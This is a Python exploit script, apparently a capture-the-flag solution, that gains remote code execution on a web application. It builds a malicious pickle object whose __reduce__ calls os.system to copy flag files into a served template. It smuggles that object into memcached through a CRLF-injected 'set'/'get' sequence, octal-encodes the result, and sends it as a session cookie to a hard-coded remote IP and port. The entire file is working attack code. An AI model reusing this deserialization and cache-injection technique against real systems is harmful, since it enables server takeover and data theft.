import pickle
import os
import requests

class RCE:
    def __reduce__(self):
        cmd = ('cat /flag* >> /app/application/templates/index.html')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset rce 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get rce')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""

def main():
    cookie = generate_exploit()
    # assert len(cookie) <= 86, "Cookie is greater than 86 characters"
    cookie = {"session" : cookie}
    r = requests.get("http://94.237.50.175:40129/", cookies=cookie)
    print(r.text)

if __name__ == "__main__":
    main()
